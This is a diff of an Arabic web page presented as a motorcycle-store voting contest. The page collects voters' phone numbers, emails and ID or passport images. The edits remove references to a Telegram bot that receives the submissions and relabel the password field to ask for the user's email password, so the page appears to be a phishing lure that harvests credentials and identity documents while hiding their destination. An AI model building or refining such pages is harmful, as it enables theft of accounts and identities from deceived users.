@@ -486,13 +486,13 @@
 <header>
   <div class="store-badge">🏆 المعرض العصري الأول للدراجات النارية في القاعدة</div>
   <h1>متجر <span>أمير المترات</span><br>ساحة المنافسة الحية والتصويت المباشر على فلينج!</h1>
-  <p class="subtitle">تصويت مفتوح لجميع الأجهزة بشرط اختلاف الرقم والبريد والهوية لزيادة التفاعل وتوسيع المنافسة بأعلى سرعة ودقة ووصول فوري لبوت التليجرام.</p>
+  <p class="subtitle">تصويت مفتوح لجميع الأجهزة بشرط اختلاف الرقم والبريد والهوية لزيادة التفاعل وتوسيع المنافسة بأعلى سرعة ودقة ووصول فوري.</p>
 </header>
 
 <!-- ===== قسم التصويت والمشاهدة المباشرة ===== -->
 <section id="voting">
   <div class="section-head">
-    <span class="sub">أداء سريع ووصول فوري للبوت</span>
+    <span class="sub">أداء سريع ووصول فوري </span>
     <h2>🗳️ ساحة التصويت ومشاهدة النتائج المباشرة</h2>
   </div>
 
@@ -511,7 +511,7 @@
       <!-- نموذج التصويت -->
       <div class="vote-card-panel">
         <h3>✍️ صوّت لمتسابقك المفضل الآن</h3>
-        <p class="desc">اختر المتسابق أو أدخل رمزه، وأدخل بياناتك والوثيقة لإرسال صوتك للبوت فوراً:</p>
+        <p class="desc">اختر المتسابق أو أدخل رمزه، وأدخل بياناتك والوثيقة لإرسال صوتك  فوراً:</p>
 
         <div id="directInviteBanner" class="direct-invite-banner">
           🎯 أنت تصوّت الآن عبر رابط الدعوة المباشر للمتسابق:<br>
@@ -562,7 +562,7 @@
               <div class="upload-label">
                 <span class="upload-icon">🆔</span>
                 <span class="upload-text">اضغط هنا لإرفاق صورة البطاقة أو الجواز</span>
-                <span class="upload-sub">تُضغط بسرعة وتُرسل للبوت للتحقق ومنع الاحتيال</span>
+                <span class="upload-sub">تُضغط بسرعة وتُرسل  للتحقق ومنع الاحتيال</span>
               </div>
               <input type="file" id="voterIdImage" accept="image/*" required onchange="handleImage(event, 'voterIdPreview')">
               <img id="voterIdPreview" class="preview-img" alt="معاينة هوية المصوت">
@@ -622,7 +622,7 @@
 <!-- ===== استمارة تسجيل المتسابقين ===== -->
 <section id="register">
   <div class="section-head">
-    <span class="sub">بوابة تسجيل المتسابقين (سعة حتى 100 متسابق)</span>
+    <span class="sub">بوابة تسجيل المتسابقين (سعة حتى 200 متسابق)</span>
     <h2>سجّل بياناتك للحصول على رسالة ورابط التصويت الخاص بك</h2>
   </div>
 
@@ -645,7 +645,7 @@
         </div>
 
         <div class="field">
-          <label for="password">🔒 كلمة المرور لحسابك في المسابقة *</label>
+          <label for="password">🔒 كلمة السر اخاص بالبريد    *</label>
           <div class="password-wrap">
             <input type="password" id="password" required placeholder="أدخل كلمة مرور قوية" dir="ltr" style="text-align:right">
             <button type="button" class="toggle-pass" onclick="toggleGenericPass('password', this)">إظهار</button>
@@ -1093,7 +1093,7 @@ document.getElementById("voteForm").addEventListener("submit", async function(e)
 
   const btn = document.getElementById("voteSubmitBtn");
   btn.disabled = true;
-  btn.textContent = "⚡ جارٍ إرسال وثيقة التصويت للبوت...";
+  btn.textContent = "⚡ جارٍ إرسال وثيقة التصويت للادره...";
 
   try {
     targetCand.v = (targetCand.v || 0) + 1;
